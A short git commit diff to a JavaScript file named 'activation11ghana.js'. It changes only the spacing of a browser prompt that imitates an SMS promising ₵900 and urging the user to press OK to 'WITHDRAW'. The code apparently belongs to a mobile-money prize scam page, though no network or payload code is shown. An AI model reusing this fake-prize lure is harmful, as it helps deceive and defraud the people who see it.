9af674bc3f3a0d489fcaca44ab66fa3be50bc5b6
mpessaa <34keeper_fusion@icloud.com>
2026-04-03 09:44:04 +0100

    Update activation11ghana.js

--- activation11ghana.js
+++ activation11ghana.js
@@ -1,6 +1,6 @@
 var password = 'WITHDRAW CASH'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive ₵900. Please press OK to WITHDRAW.',
+  'SMS: Congratulations! You are eligible to receive ₵900.  Please press OK to WITHDRAW.',
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
